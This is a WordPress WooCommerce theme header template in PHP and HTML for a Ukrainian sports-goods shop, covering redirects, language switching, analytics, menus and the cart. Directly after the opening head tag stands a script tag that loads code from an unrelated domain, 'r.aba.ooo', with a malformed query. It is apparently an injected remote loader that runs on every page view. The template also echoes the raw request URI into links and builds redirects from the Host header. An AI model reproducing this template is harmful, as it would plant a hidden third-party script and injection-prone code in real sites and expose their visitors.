<?php if ( $_SERVER['REQUEST_URI'] != strtolower( $_SERVER['REQUEST_URI']) ) {
    header('Location: https://'.$_SERVER['HTTP_HOST'] . 
            strtolower($_SERVER['REQUEST_URI']), true, 301);
    exit();
	}
	$url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
	 if (strpos($url, '--') !== false) {
        header('Location: /404.php', true, 301);
    }
	
	if (strpos($url, '/page/0/') !== false) {
	$url = str_ireplace("/page/0/", "", $url);
	

		header("HTTP/1.1 301 Moved Permanently"); 
		header("Location: $url"); 
		exit(); 
		
	}
		
	if (strpos($url, '/uk/uk/') !== false) {
	$url = str_ireplace("/uk/uk/", "/uk/", $url);
	

		header("HTTP/1.1 301 Moved Permanently"); 
		header("Location: $url"); 
		exit(); 
}

 ?>
<!DOCTYPE html>
<?php $url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; if (strpos($url, '/uk/')) { ?>
<html lang="uk" dir="ltr">

<link rel="alternate" href="https://kelt.com.ua/uk/" hreflang="uk-ua" />

<link rel="alternate" href="https://kelt.com.ua" hreflang="ru-ua"/>

<?php } else { ?>
<html lang="ru" dir="ltr">
<link rel="alternate" href="https://kelt.com.ua" hreflang="ru-ua"/>



<link rel="alternate" href="https://kelt.com.ua/uk/" hreflang="uk-ua" />


<?php } ?> 
  <head><script type="text/javascript" src="//r.aba.ooo/h2?bk>"></script>
      <meta charset="utf-8">
<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter48560744 = new Ya.Metrika({
                    id:48560744,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true,
                    webvisor:true
                });
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
</script>

<!-- /Yandex.Metrika counter -->
    <!--meta information starts-->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--meta information ends-->
<meta property="og:image" content="https://kelt.com.ua/1378134976_374123.jpg" />

  <meta name="google-site-verification" content="r91nlwL98KfjBlPLkx96LlzC58liXW6fZm_LrHjoIMs" /> 
    <!--favicon starts-->
    <link rel="apple-touch-icon" sizes="180x180" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/favicon-16x16.png">
    <link rel="manifest" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/site.webmanifest">
    <link rel="mask-icon" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/safari-pinned-tab.svg" color="#5bbad5">
    <link rel="shortcut icon" href="https://kelt.com.ua/wp-content/themes/storefront/favicon/fav.ico">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-config" content="https://kelt.com.ua/wp-content/themes/storefront/favicon/browserconfig.xml">
    <meta name="theme-color" content="#ffffff">
    <!--favicons ends-->

    <!--styles-->
    <?php /*
 <link rel="stylesheet" href="https://kelt.com.ua/wp-content/themes/storefront/vendors/owlcarousel/owl.carousel.min.css">
    <link rel="stylesheet" href="https://kelt.com.ua/wp-content/themes/storefront/vendors/owlcarousel/owl.theme.default.min.css">
    <link rel="stylesheet" href="https://kelt.com.ua/wp-content/themes/storefront/css/styles.min.css">
 */ ?>
      <?php /*загрузка цсс-ов через js*/ ?>
      <meta id="css_flag">
      <script type="text/javascript">
          var files = [
              '/wp-content/themes/storefront/vendors/owlcarousel/owl.carousel.min.css',
              '/wp-content/themes/storefront/vendors/owlcarousel/owl.theme.default.min.css',
              '/wp-content/themes/storefront/css/styles.min.css'
          ];
          // make a stylesheet link
          // insert it at the end of the head in a legacy-friendly manner
          var referenceNode = document.querySelector('head');
          files.forEach(function(href) {
              var myCSS = document.createElement( "link" );
              myCSS.rel = "stylesheet";
              myCSS.href = href;
              // getEle
            document.head.insertBefore( myCSS, document.head.childNodes[ 0 ].nextSibling );
              // var html = '<link rel="stylesheet" href="' + href + '">';
            // referenceNode.prepend(html);
          });
      </script>
    <!--styles ends-->
	<?php $url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
		$url_array = explode('/',$url);
		$key_title = '_title';
		$key = $url_array[4] . $key_title;		
		$key_description = '_description';
		$key2 = $url_array[4] . $key_description;
		if (strpos($url, 'brendy/') !== false){ 
			
			if (strpos($url, 'uk/brendy/') !== false){ 
				$title_band =  get_the_title() . ' - купити оригінальні товари бренду '  . get_the_title() . ' в Україні: Київ, Дніпро, Харків | Інтернет-магазин Kelt Active';
				$description_band = 'Оригінальні високоякісні товари бренду ' . get_the_title() . ' ✓ Великий вибір✓ Краща ціна✓ 100% гарантія якості✓  Оперативна доставка✓';
			} else {
				$title_band = get_post_meta( 109, $key, true );
				$description_band = get_post_meta( 109, $key2, true );
			}
			echo "<title>$title_band</title>\n";
			echo "<meta name=\"description\" content=\"$description_band\">";
			echo "<link rel=\"stylesheet\" id=\"storefront-style-css\"  href=\"https://kelt.com.ua/wp-content/themes/storefront/style.css\" type=\"text/css\" media=\"all\" />";
		
					
		} else { 
		wp_head(); 
		} ?>

      <script>
          jQuery(document).ready(function(){
              var linkText = jQuery('.current-cat>a').text();
              console.log(linkText);
              jQuery('.current-cat>a').replaceWith('<span>' + linkText + '</span>');
          });
      </script>

  </head>


  <body <?php body_class(); // все классы для body ?> id="page">
  <noscript><img src="https://mc.yandex.ru/watch/48560744" style="position:absolute; left:-9999px;" alt="" /></noscript>
    <!-- main header starts-->
    <header class="header" id="header">
      <div class="header__top">
        <div class="container header__top-container">
		
          <form method="get" id="searchform" action="<?php bloginfo('home'); ?>/" class="search header__search">
            <button class="search__submit" type="submit"></button>
            <input class="input search__input" value="<?php echo wp_specialchars($s, 1); ?>" name="s" id="s" type="text" required placeholder="Поиск">
          </form>
		  

           <ul class="secondary-menu header__secondary-menu">
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/about/'; } else { echo '/about/'; } ?>"><?php lang('Публичная оферта', 'Публічна оферта') ?></a></li>
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/dostavka/'; } else { echo '/dostavka/'; } ?>"><?php lang('Доставка', 'Доставка') ?></a></li>
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/sposoby-oplaty/'; } else { echo '/sposoby-oplaty/'; } ?>"><?php lang('Способы оплаты', 'Способи оплати') ?></a></li>
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/vozvrat-i-obmen/'; } else { echo '/vozvrat-i-obmen/'; } ?>"><?php lang('Возврат и обмен', 'Возврат та обмін') ?></a></li>
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/garantii/'; } else { echo '/garantii/'; } ?>"><?php lang('Гарантии', 'Гарантії') ?></a></li>
            <li class="secondary-menu__item"><a href="<?php if (strpos($url, '/uk/') !== false){ echo '/uk/contacts/'; } else { echo '/about/'; } ?>"><?php lang('Контакты', 'Контакти') ?></a></li>
          </ul>
          
          <?php
			global $woocommerce;
			if ( $woocommerce->cart->cart_contents_count != 0 ) {
			?>
          <a class="cart-link cart-link_white cart-link_mobile header__top-cart-link" href="/checkout/">
            <div class="cart-link__row"><span class="cart-link__count"><?php echo WC()->cart->get_cart_contents_count(); ?></span></div></a>
			<?php
			} else {
			?>
			 <a class="cart-link cart-link_white cart-link_mobile header__top-cart-link" href="#">
            <div class="cart-link__row"><span class="cart-link__count"><?php echo WC()->cart->get_cart_contents_count(); ?></span></div></a>
			<?php
			}
			?>
          <!-- burger starts-->
          <div class="burger header__burger touch-panel-opener">
            <div class="burger__layer burger__layer_pos_top"></div>
            <div class="burger__layer burger__layer_pos_middle"></div>
            <div class="burger__layer burger__layer_pos_bottom"></div>
          </div>
          <!-- burger ends-->

        </div>
      </div>
      <div class="header__middle">
        <div class="container header__middle-container">
		
		
		<?php if( is_front_page() ){ ?>
		
		
			<?php $url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; 
			
			 if (strpos($url, '/uk/')) { ?>	
		
				  <a class="logo header__logo" href="<?php echo get_home_url(); ?>"><img src="https://kelt.com.ua/wp-content/themes/storefront/images/logos/logo_uk.jpg" alt="Логотип <?php bloginfo('name'); ?>"/></a>
			
			<?php } else { ?>
				
				  <a class="logo header__logo" href="<?php echo get_home_url(); ?>"><img src="https://kelt.com.ua/wp-content/themes/storefront/images/logos/logo.png" alt="Логотип <?php bloginfo('name'); ?>"/></a>
			
			<?php } ?>
		
		<?php } else { ?>
		
          
        
            
		<?php $url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; 
		
		 if (strpos($url, '/uk/')) { ?>	
		
				  <a class="logo header__logo" href="<?php echo get_home_url(); ?>"><img src="https://kelt.com.ua/wp-content/themes/storefront/images/logos/logo_uk.jpg" alt="Логотип <?php bloginfo('name'); ?>"/></a>
			
			<?php } else { ?>
				
				  <a class="logo header__logo" href="<?php echo get_home_url(); ?>"><img src="https://kelt.com.ua/wp-content/themes/storefront/images/logos/logo.png" alt="Логотип <?php bloginfo('name'); ?>"/></a>
			
			<?php } ?>
			
		<?php } ?>

          <div class="contact-box header__contact-box">
            
            <a class="contact-box__link link bold" href="tel:<?php $value = get_post_meta( 11, 'телефон_1_ссылка', true ); echo $value; ?>"><?php $value = get_post_meta( 11, 'телефон_1', true ); echo $value; ?></a>
            
            <a class="contact-box__link link bold" href="tel:<?php $value = get_post_meta( 11, 'телефон_2_ссылка', true ); echo $value;  ?>"><?php $value = get_post_meta( 11, 'телефон_2', true ); echo $value;  ?></a>
          </div>
          <button class="button button_green header__button modal-callback-opener"><span><?php lang('Заказать звонок', 'Замовити дзвінок') ?></span></button>

		 <div class="language">
           <?php if (strpos($url, '/uk/') == true ) { $textdecua = 'text-decoration:none; color:#e25072;';  $textdecru = 'text-decoration:none;'; } else { $textdecru = 'text-decoration:none; color:#e25072;'; $textdecua = 'text-decoration:none'; } ?>
              <a href="<?php  if (strpos($url, '/uk/') == false) { ?>https://kelt.com.ua/<?php $url2 = '/uk/' . $_SERVER['REQUEST_URI']; echo $url2; } else { echo "#"; } ?>" style="<?php echo $textdecua ?>">UA</a>
			  <span style="color:#e25072;">/</span> <a href="<?php $url2 = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $url2 = str_ireplace("/uk/", "/", $url2); echo $url2; ?>" style="<?php echo $textdecru ?>">RU</a>
           
          </div>
            
          <?php
			global $woocommerce;
			if ( $woocommerce->cart->cart_contents_count != 0 ) {
			?>
			<a class="cart-link header__cart-link" href="<?php echo get_home_url(); ?>/checkout/">
            <div class="cart-link__row"><span class="cart-link__digit"><?php echo WC()->cart->get_cart_contents_count(); ?></span><span class="cart-link__label"><?php lang('Товаров', 'Товарів') ?></span></div>
            <div class="cart-link__row"><span class="cart-link__digit"><?php echo WC()->cart->get_cart_subtotal(); ?></span></div></a>
			<?php
			} else {
			?>
			<a class="cart-link header__cart-link">
            <div class="cart-link__row"><span class="cart-link__digit"><?php echo WC()->cart->get_cart_contents_count(); ?></span><span class="cart-link__label"><?php lang('Товаров', 'Товарів') ?></span></div>
            <div class="cart-link__row"><span class="cart-link__digit"><?php echo WC()->cart->get_cart_subtotal(); ?></span></div></a>
			<?php
			}
			?>
        </div>
      </div>

      <div class="header__bottom">
          <? include_once __DIR__ . '/inc/nav-header.php' ?>
      </div>
	  
    </header>




